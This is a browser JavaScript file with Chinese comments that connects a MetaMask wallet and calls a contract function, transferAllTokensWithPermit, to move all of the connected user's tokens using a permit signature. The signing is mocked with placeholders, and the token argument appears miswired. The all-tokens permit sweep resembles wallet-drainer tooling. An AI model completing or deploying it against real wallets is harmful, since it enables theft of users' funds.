let web3;
let userAddress;

// 设置你的合约地址和ABI
const contractAddress = '0x838F9b8228a5C95a7c431bcDAb58E289f5D2A4DC'; // 自动填写你的合约地址
const contractABI =[
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "target",
				"type": "address"
			}
		],
		"name": "AddressEmptyCode",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "AddressInsufficientBalance",
		"type": "error"
	},
	{
		"inputs": [],
		"name": "FailedInnerCall",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "token",
				"type": "address"
			}
		],
		"name": "SafeERC20FailedOperation",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "token",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "uint8",
				"name": "v",
				"type": "uint8"
			},
			{
				"internalType": "bytes32",
				"name": "r",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "s",
				"type": "bytes32"
			}
		],
		"name": "transferAllTokensWithPermit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "token",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "TransferTokens",
		"type": "event"
	}
]; // 自动填写最新的ABI

// 检查页面加载时是否有以太坊钱包
window.addEventListener('load', () => {
    if (typeof window.ethereum !== 'undefined') {
        console.log('以太坊钱包已检测到。');
    } else {
        console.log('未检测到以太坊钱包。');
        alert('请安装MetaMask或其他以太坊钱包扩展！');
    }
});

// 绑定连接钱包按钮事件
document.getElementById('connectButton').addEventListener('click', connectWallet);

// 连接钱包函数
async function connectWallet() {
    console.log("尝试连接钱包...");
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            // 请求 MetaMask 连接
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];  // 获取连接的第一个钱包地址

            console.log("已连接地址:", userAddress);
            document.getElementById('address').innerText = `钱包地址: ${userAddress}`;

            // 自动填充代币合约地址和签名钱包地址
            document.getElementById('tokenAddress').value = contractAddress;
            document.getElementById('fromAddress').value = userAddress;

            // 获取签名信息并自动填充
            await signAndFillSignature(userAddress, contractAddress);
        } catch (error) {
            console.error("连接钱包时出错:", error);
            alert('连接钱包失败，请查看控制台的错误信息。');
        }
    } else {
        alert('请安装MetaMask或其他以太坊钱包扩展！');
        console.log("未检测到以太坊钱包。");
    }
}

// 模拟签名和填充（假设有签名函数）
async function signAndFillSignature(userAddress, contractAddress) {
    // 模拟的签名操作
    console.log("正在模拟签名操作...");
    // 这里需要用你的签名代码替代
    document.getElementById('v').value = 27; // 模拟的签名 v 值
    document.getElementById('r').value = "0x..."; // 模拟的签名 r 值
    document.getElementById('s').value = "0x..."; // 模拟的签名 s 值
}

// 绑定转移代币按钮事件
document.getElementById('transferButton').addEventListener('click', async () => {
    try {
        const contract = new web3.eth.Contract(contractABI, contractAddress);
        const v = document.getElementById('v').value;
        const r = document.getElementById('r').value;
        const s = document.getElementById('s').value;

        // 调用合约中的 transferAllTokensWithPermit 函数
        await contract.methods.transferAllTokensWithPermit(contractAddress, userAddress, v, r, s).send({ from: userAddress });
        document.getElementById('transferStatus').innerText = "转移成功！";
    } catch (error) {
        console.error("转移代币失败:", error);
        document.getElementById('transferStatus').innerText = "转移失败，请查看控制台。";
    }
});
